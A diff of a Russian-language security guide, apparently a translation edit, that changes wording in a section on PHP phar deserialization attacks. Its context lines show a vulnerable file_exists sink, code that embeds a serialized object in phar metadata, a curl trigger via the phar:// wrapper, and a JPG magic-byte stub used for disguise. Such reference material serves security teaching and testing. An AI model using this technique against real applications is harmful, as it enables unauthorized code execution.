@@ -168,7 +168,7 @@ class AnyClass {
 echo file_exists($_GET['page']);
 ```
 
-* Мы можем создать phar-архив, содержащий сериализованный объект в своих метаданных.
+* Можно создать phar-архив, содержащий сериализованный объект в своих метаданных.
 
 ```php
 // создаем новый Phar
@@ -193,9 +193,9 @@ $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
 
-Наконец, вызовите wrapper ```phar: curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar```
+Вызови wrapper ```phar: curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar```
 
-ПРИМЕЧАНИЕ: вы можете использовать ```$phar->setStub()```, чтобы добавить магические байты JPG файла: ```\xff\xd8\xff```
+**ПРИМЕЧАНИЕ**: Можно использовать ```$phar->setStub()```, чтобы добавить магические байты JPG файла: ```\xff\xd8\xff```
 
 ```php
 $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
